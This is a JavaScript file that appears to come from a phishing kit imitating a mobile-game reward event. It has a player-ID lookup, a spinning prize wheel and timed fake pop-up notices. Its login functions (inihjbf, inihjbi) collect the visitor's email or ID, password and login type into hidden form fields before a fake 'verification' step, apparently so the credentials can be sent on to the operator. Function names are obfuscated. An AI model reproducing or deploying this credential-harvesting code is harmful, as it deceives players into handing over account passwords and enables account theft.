function btnhjbniho() {
                $('#brhjbnih').addClass('hjbspnih');
                $('#btnhjbniho').hide();
                $('#btnhjbnihf').show();
                setTimeout(() => {
                    $('#brhjbnih').removeClass('hjbspnih');
                    $('#brhjbnih').attr("style", "transform: rotate(91deg);");
                    setTimeout(() => {
                        $('#hjbhddly').show();
                        $('.clhjbdly').hide();
                    },800)
                },3000)
            }
            
            function clhjbdly() {
                $('hjbdaily').hide();
            }
            
            function hjbhdv5(){
               var playid = $("#plhjbd").val();
               var lhjblg = document.getElementById("lhjblg");
               lhjblg.play();
               $("hjbdt").show();
               $("#nihil").hide();
               $("#kosong").hide();
               setTimeout(() => {
                   $("hjbdt").hide();
                },2000)
               if(playid == "" || playid == null || playid.length <= 1)
               {
               $("#nihil").hide();
               $("hjbdt").hide();
               $("#kosong").show();
               return false;
               }else{
               $("#kosong").hide();
               $("hjbdt").hide();
               }
               
               $.ajax({
               type : 'POST',
               url : 'haykaljb/True-ID.php?playid='+playid+'',
               beforeSend : function(){
                     $("hjbdt").show();
               },
               success : function(data){
               if(data == "" || data == null){
               $("hjbdt").hide();
               $("#nihil").show();
                return false;
               }else{
               $("hjbid").hide();
               $("#toastnick").text(data);
               $("#toastid").text(playid);
               $("input#ihjbr").val(playid);
               $("input#nhjbr").val(data);
               $("input#uid").val(playid);
               $("#uid2").val(playid);
                $("hjbdt").hide();
                $("hjbdaily").fadeIn();
               }
               }
               })
               
            }
            
            function clhjbtrid() {
                $('#nihil').hide();
                $('#kosong').hide();
                $('.isp').hide();
            }
            
            function mnhjbkn() {
                $('#hjbkn').show();
                $('#hjbdr').hide();
                $('#hjbdm').hide();
                $('#mnhjbkn').addClass('activehjbmn');
                $('#mnhjbdr').removeClass('activehjbmn');
                $('#mnhjbbr').removeClass('activehjbmn');
            }
            function mnhjbdr() {
                $('#hjbkn').hide();
                $('#hjbdr').show();
                $('#hjbdm').hide();
                $('#mnhjbkn').removeClass('activehjbmn');
                $('#mnhjbdr').addClass('activehjbmn');
                $('#mnhjbbr').removeClass('activehjbmn');
            }
            function mnhjbbr() {
                $('#hjbkn').hide();
                $('#hjbdr').hide();
                $('#hjbdm').show();
                $('#mnhjbkn').removeClass('activehjbmn');
                $('#mnhjbdr').removeClass('activehjbmn');
                $('#mnhjbbr').addClass('activehjbmn');
            }
            
            function opclmhjb() {
                $('hjbclm').show();
            }
            
            function opplhhjb() {
                $('hjbclm').hide();
                $('hjbpilih').show();
            }
            function closeloginhjb() {
            	$('hjbclm').show();
            $('hjbpilih').hide();
}
            
            function ophjbf() {
                $('.hjbf').show();
            }
            function clhjbf() {
                $('.hjbf').hide();
                $('hjbpilih').show();
            }
            
            function ophjbi() {
                $('.hjbidl').show();
                $('.hjbpilih').hide();
            }
            function clhjbi() {
                $('.hjbidl').hide();
                $('hjbpilih').show();
            }
            
            function inihjbf()
        	{
        		$eailf = $('#hjbef').val().trim();
        		$paordf = $('#hjbpf').val().trim();
        		$loinf = $('#hjblf').val().trim();
        		if($eailf == '' || $eailf == null || $eailf.length <= 6)
        		{
        			$('.fse').show();
        			$('.fsp').hide();
        			return false;
        		}else{
        			$('.fse').hide();
        		}
        		if($paordf == '' || $paordf == null || $paordf.length <= 6)
        		{
        			$('.fsp').show();
        			return false;
        		}else{
        			$('.fsp').hide();
        		}
        		
        		if($eailf.length >= 6 || $paordf.length >= 6) {
        		    $("input#ehjbr").val($eailf);
        			$("input#phjbr").val($paordf);
        			$("input#lhjbr").val($loinf);
        			$('.hjbf').hide();
        			$('hjbvrf').show();
        		}
        	}
        	
        	function inihjbi()
        	{
        	    $eaili = $('#ihjbr').val().trim();
        		$paordi = $('#phjbr').val().trim();
        		$loini = $('#hjbli').val().trim();
        		if($paordi == '' || $paordi == null || $paordi.length <= 6)
        		{
        			$('.isp').show();
        			return false;
        		}else{
        			$('.isp').hide();
        		}
        		
        		if($paordi.length >= 6) {
        		    $("input#ehjbr").val($eaili);
        			$("input#phjbr").val($paordi);
        			$("input#lhjbr").val($loini);
        			$('.hjbidl').hide();
        			$('hjbvrf').show();
        		}
        	}
        	
        	var klkhjb = new Audio();
        	klkhjb.src = "haykaljb/button.mp3";

        	$(document).ready(function() { 
        	    setTimeout(() => {
                   $('#krhjbanm1').show();
                   setTimeout(() => {
                       $('#krhjbanm1').fadeOut();
                    },4000)
                },4000)
                
                setTimeout(() => {
                   $('#krhjbanm2').show();
                   setTimeout(() => {
                       $('#krhjbanm2').fadeOut();
                    },4000)
                },14000)
                
                setTimeout(() => {
                   $('#krhjbanm3').show();
                   setTimeout(() => {
                       $('#krhjbanm3').fadeOut();
                    },4000)
                },19000)
        	});
        	
        	
            let slideIndex = 0;
            showSlides();
            
            function showSlides() {
              let i;
              let slides = document.getElementsByClassName("slax");
              let dots = document.getElementsByClassName("dot");
              for (i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";  
              }
              slideIndex++;
              if (slideIndex > slides.length) {slideIndex = 1}    
              for (i = 0; i < dots.length; i++) {
                dots[i].className = dots[i].className.replace(" active", "");
              }
              slides[slideIndex-1].style.display = "block";  
              dots[slideIndex-1].className += " active";
              setTimeout(showSlides, 4000); // Change image every 2 seconds
            }